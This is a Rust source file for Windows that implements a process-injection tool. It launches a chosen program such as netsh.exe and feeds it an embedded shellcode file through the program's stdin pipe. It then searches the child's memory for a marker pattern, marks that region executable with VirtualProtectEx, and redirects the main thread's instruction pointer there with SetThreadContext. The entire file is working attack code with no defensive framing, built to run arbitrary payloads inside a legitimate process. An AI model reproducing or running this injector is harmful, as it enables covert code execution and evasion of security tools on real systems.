use std::{
    io::{self, BufRead},
    mem::{size_of, zeroed},
    os::raw::c_void,
    os::windows::ffi::OsStrExt,
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::Threading::{NtQueryInformationThread, ThreadQuerySetWin32StartAddress},
    Win32::{
        Foundation::{
            CloseHandle, GetLastError, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
            SetHandleInformation,
        },
        Security::SECURITY_ATTRIBUTES,
        Storage::FileSystem::{ReadFile, WriteFile},
        System::{
            Diagnostics::{
                Debug::{
                    CONTEXT, CONTEXT_CONTROL_AMD64, GetThreadContext, ReadProcessMemory,
                    SetThreadContext,
                },
                ToolHelp::{
                    CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, TH32CS_SNAPMODULE,
                    TH32CS_SNAPMODULE32, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                    Thread32Next,
                },
            },
            Memory::{
                MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ,
                PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS,
                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VirtualProtectEx, VirtualQueryEx,
            },
            Pipes::{CreatePipe, PeekNamedPipe},
            SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO},
            Threading::{
                CREATE_NEW_CONSOLE, CreateProcessW, OpenThread, PROCESS_INFORMATION, ResumeThread,
                STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW, Sleep, SuspendThread,
                THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_QUERY_LIMITED_INFORMATION,
                THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
            },
        },
        UI::WindowsAndMessaging::SW_SHOW,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE.len();

#[repr(C, align(16))]
struct AlignedContext {
    ctx: CONTEXT,
}

fn read_from_pipe(h_pipe_read: *mut c_void) -> String {
    unsafe {
        let mut bytes_available: u32 = 0;
        if PeekNamedPipe(
            h_pipe_read,
            null_mut(),
            0,
            null_mut(),
            &mut bytes_available,
            null_mut(),
        ) == 0
        {
            println!("[-] PeekNamedPipe failed: {}", GetLastError());
            return String::new();
        }

        if bytes_available == 0 {
            return String::new();
        }

        let mut buffer: Vec<u8> = vec![0; bytes_available as usize];
        let mut bytes_read: u32 = 0;
        if ReadFile(
            h_pipe_read,
            buffer.as_mut_ptr() as *mut u8,
            bytes_available,
            &mut bytes_read,
            null_mut(),
        ) == 0
            && bytes_read == 0
        {
            println!("[-] ReadFile failed: {}", GetLastError());
            return String::new();
        }

        String::from_utf8_lossy(&buffer[..bytes_read as usize]).to_string()
    }
}

fn write_to_pipe(h_pipe_write: *mut c_void, command: &str) -> bool {
    unsafe {
        let mut bytes_written: u32 = 0;
        let result = WriteFile(
            h_pipe_write,
            command.as_ptr() as *mut u8,
            command.len() as u32,
            &mut bytes_written,
            null_mut(),
        );

        if result == 0 {
            println!("[-] WriteFile failed: {}", GetLastError());
            return false;
        }
        true
    }
}

fn write_to_pipe_bin(h_pipe_write: *mut c_void, buffer: &[u8], size: usize) -> bool {
    unsafe {
        let mut bytes_written: u32 = 0;
        let result = WriteFile(
            h_pipe_write,
            buffer.as_ptr(),
            size as u32,
            &mut bytes_written,
            null_mut(),
        );

        if result == 0 {
            println!("[-] WriteFile failed: {}", GetLastError());
            return false;
        }
        true
    }
}

fn hex_dump(data: &[u8], size: usize, base: usize) {
    for i in 0..size {
        if i % 16 == 0 {
            print!("{:08X}: ", base + i);
        }
        print!("{:02X} ", data[i]);
        if i % 16 == 15 || i == size - 1 {
            println!();
        }
    }
}

fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
    unsafe {
        if pattern.is_empty() {
            return 0;
        }

        let mut sys_info = zeroed::<SYSTEM_INFO>();
        GetNativeSystemInfo(&mut sys_info);

        let mut address = sys_info.lpMinimumApplicationAddress as usize;
        let max_address = sys_info.lpMaximumApplicationAddress as usize;

        let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();
        let mut buffer: Vec<u8> = Vec::new();

        let pattern_size = pattern.len();

        while address < max_address {
            if VirtualQueryEx(
                h_process,
                address as *const c_void,
                &mut mbi,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            ) == 0
            {
                address += sys_info.dwPageSize as usize;
                continue;
            }

            let is_private = mbi.Type == MEM_PRIVATE;
            let is_committed = mbi.State == MEM_COMMIT;
            let is_readable = mbi.Protect
                & (PAGE_READONLY
                    | PAGE_READWRITE
                    | PAGE_EXECUTE_READ
                    | PAGE_EXECUTE_READWRITE
                    | PAGE_WRITECOPY
                    | PAGE_EXECUTE_WRITECOPY)
                != 0;
            let is_guarded = mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS) != 0;

            if is_private && is_committed && is_readable && !is_guarded {
                let region_size = mbi.RegionSize;

                if region_size >= pattern_size {
                    buffer.resize(region_size, 0);
                    let mut bytes_read: usize = 0;

                    if ReadProcessMemory(
                        h_process,
                        mbi.BaseAddress as *const c_void,
                        buffer.as_mut_ptr() as *mut c_void,
                        region_size,
                        &mut bytes_read,
                    ) != 0
                        && bytes_read >= pattern_size
                    {
                        let limit = bytes_read - pattern_size;

                        for i in 0..=limit {
                            if &buffer[i..i + pattern_size] == pattern {
                                return mbi.BaseAddress as usize + i;
                            }
                        }
                    }
                }
            }

            address = mbi.BaseAddress as usize + mbi.RegionSize;
        }
    }

    0
}

fn get_main_thread_id(pid: u32) -> u32 {
    unsafe {
        let mut image_base: usize = 0;
        let mut image_end: usize = 0;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if snap != INVALID_HANDLE_VALUE {
            let mut me = zeroed::<MODULEENTRY32W>();
            me.dwSize = size_of::<MODULEENTRY32W>() as u32;
            if Module32FirstW(snap, &mut me) != 0 {
                image_base = me.modBaseAddr as usize;
                image_end = image_base + me.modBaseSize as usize;
            }
            CloseHandle(snap);
        }

        let mut best: u32 = 0;
        let mut first_any: u32 = 0;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snap == INVALID_HANDLE_VALUE {
            return 0;
        }

        let mut te = zeroed::<THREADENTRY32>();
        te.dwSize = size_of::<THREADENTRY32>() as u32;

        if Thread32First(snap, &mut te) != 0 {
            loop {
                if te.th32OwnerProcessID == pid {
                    if first_any == 0 {
                        first_any = te.th32ThreadID;
                    }

                    let ht = OpenThread(
                        THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION,
                        0,
                        te.th32ThreadID,
                    );
                    if !ht.is_null() {
                        let mut start_addr: usize = 0;
                        NtQueryInformationThread(
                            ht,
                            ThreadQuerySetWin32StartAddress,
                            &mut start_addr as *mut _ as *mut c_void,
                            size_of::<usize>() as u32,
                            null_mut(),
                        );
                        CloseHandle(ht);

                        if start_addr != 0
                            && image_base != 0
                            && image_end != 0
                            && start_addr >= image_base
                            && start_addr < image_end
                        {
                            best = te.th32ThreadID;
                            break;
                        }
                    }
                }

                if Thread32Next(snap, &mut te) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);

        if best != 0 { best } else { first_any }
    }
}

fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
    unsafe {
        let ht = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
            0,
            tid,
        );
        if ht.is_null() {
            println!("[-] OpenThread failed: {}", GetLastError());
            return false;
        }

        if SuspendThread(ht) == u32::MAX {
            println!("[-] SuspendThread failed: {}", GetLastError());
            CloseHandle(ht);
            return false;
        }

        let mut aligned: AlignedContext = zeroed();
        let ctx = &mut aligned.ctx;
        ctx.ContextFlags = CONTEXT_CONTROL_AMD64;

        if GetThreadContext(ht, ctx as *mut CONTEXT) == 0 {
            println!("[-] GetThreadContext failed: {}", GetLastError());
            ResumeThread(ht);
            CloseHandle(ht);
            return false;
        }

        println!(
            "[+] Thread {}: old RIP = 0x{:X}, RSP = 0x{:X}",
            tid, ctx.Rip, ctx.Rsp
        );

        ctx.Rip = new_rip;

        if SetThreadContext(ht, ctx as *const CONTEXT) == 0 {
            println!("[-] SetThreadContext failed: {}", GetLastError());
            ResumeThread(ht);
            CloseHandle(ht);
            return false;
        }
        println!("[+] Thread {}: new RIP = 0x{:X}", tid, new_rip);

        if resume_after {
            if ResumeThread(ht) == u32::MAX {
                println!("[-] ResumeThread failed: {}", GetLastError());
            } else {
                println!("[+] Thread {} resumed", tid);
            }
        }
        CloseHandle(ht);
        true
    }
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 2 {
        println!("Usage: {} <executable_path>", args[0]);
        println!("Example: {} C:\\Windows\\System32\\netsh.exe", args[0]);
        return;
    }

    let proc_name = &args[1];
    let mut proc_name_w: Vec<u16> = std::ffi::OsStr::new(proc_name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    println!("[+] Launching: {}\n", proc_name);

    unsafe {
        let mut h_child_in_rd: *mut c_void = null_mut();
        let mut h_child_in_wr: *mut c_void = null_mut();
        let mut h_child_out_rd: *mut c_void = null_mut();
        let mut h_child_out_wr: *mut c_void = null_mut();

        let mut sa = zeroed::<SECURITY_ATTRIBUTES>();
        sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
        sa.bInheritHandle = 1;
        sa.lpSecurityDescriptor = null_mut();

        if CreatePipe(&mut h_child_out_rd, &mut h_child_out_wr, &sa, 0) == 0 {
            println!("[-] CreatePipe failed: {}", GetLastError());
            return;
        }
        SetHandleInformation(h_child_out_rd, HANDLE_FLAG_INHERIT, 0);

        if CreatePipe(&mut h_child_in_rd, &mut h_child_in_wr, &sa, 0) == 0 {
            println!("[-] CreatePipe failed: {}", GetLastError());
            return;
        }
        SetHandleInformation(h_child_in_wr, HANDLE_FLAG_INHERIT, 0);

        let mut si = zeroed::<STARTUPINFOW>();
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        si.cb = size_of::<STARTUPINFOW>() as u32;
        si.hStdInput = h_child_in_rd;
        si.hStdOutput = h_child_out_wr;
        si.hStdError = h_child_out_wr;
        si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW as u16;

        if CreateProcessW(
            null_mut(),
            proc_name_w.as_mut_ptr(),
            null_mut(),
            null_mut(),
            1,
            CREATE_NEW_CONSOLE,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] CreateProcessW failed: {}", GetLastError());
            return;
        }

        CloseHandle(h_child_out_wr);
        CloseHandle(h_child_in_rd);

        Sleep(200);

        write_to_pipe_bin(h_child_in_wr, SHELLCODE, SHELLCODE_SIZE);

        Sleep(2000);

        let output = read_from_pipe(h_child_out_rd);
        println!("[+] Output from {}:\n{}", proc_name, output);

        let raw_data: &[u8] = &[
            0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64, 0x65, 0x65,
            0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A, 0x6A,
        ];

        let mut result = find_pattern(pi.hProcess, raw_data);
        if result == 0 {
            println!("[-] Pattern not found in process memory.");
            Sleep(2000);
            result = find_pattern(pi.hProcess, raw_data);
        }

        if result != 0 {
            println!("[+] Found at remote address: 0x{:X}", result);
            let size = SHELLCODE_SIZE;
            let new_protect = PAGE_EXECUTE_READWRITE;

            let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();
            if VirtualQueryEx(
                pi.hProcess,
                result as *const c_void,
                &mut mbi,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            ) != 0
            {
                println!(
                    "[+] Region @ 0x{:X}: base=0x{:X} size=0x{:X} state=0x{:X} protect=0x{:X} type=0x{:X}",
                    result,
                    mbi.BaseAddress as usize,
                    mbi.RegionSize,
                    mbi.State,
                    mbi.Protect,
                    mbi.Type
                );
            } else {
                println!(
                    "[-] VirtualQueryEx failed (continuing anyway): {}",
                    GetLastError()
                );
            }

            let mut buf: Vec<u8> = vec![0u8; size];
            let mut got: usize = 0;
            if ReadProcessMemory(
                pi.hProcess,
                result as *const c_void,
                buf.as_mut_ptr() as *mut c_void,
                size,
                &mut got,
            ) == 0
            {
                println!("[-] ReadProcessMemory failed: {}", GetLastError());
                CloseHandle(pi.hProcess);
                return;
            }
            println!("[+] Read {}/{} bytes from 0x{:X}\n", got, size, result);

            let mut old_prot: u32 = 0;
            if VirtualProtectEx(
                pi.hProcess,
                result as *const c_void,
                size,
                new_protect,
                &mut old_prot,
            ) == 0
            {
                println!("[-] VirtualProtectEx failed: {}", GetLastError());
                CloseHandle(pi.hProcess);
                return;
            }
            println!(
                "[+] VirtualProtectEx OK: 0x{:X} size={} old=0x{:X} new=0x{:X}\n",
                result, size, old_prot, new_protect
            );

            let main_tid = get_main_thread_id(pi.dwProcessId);
            if main_tid == 0 {
                println!("[!] Could not find main thread for PID {}", pi.dwProcessId);
                CloseHandle(pi.hProcess);
                return;
            }
            println!("[+] Main thread TID = {}", main_tid);

            let target_rip = result as u64 + 0x19;
            if !hijack_thread_rip(main_tid, target_rip, true) {
                println!("[!] Failed to hijack thread {}", main_tid);
                CloseHandle(pi.hProcess);
                return;
            }

            println!(
                "\n[+] Done. Main thread now executing at 0x{:X}",
                target_rip
            );
        } else {
            println!("Pattern not found.");
        }

        println!("\n[+] Press Enter to exit and trigger child thread...");
        let _ = io::stdin().lock().read_line(&mut String::new());

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(h_child_out_rd);
        CloseHandle(h_child_in_wr);
    }
}
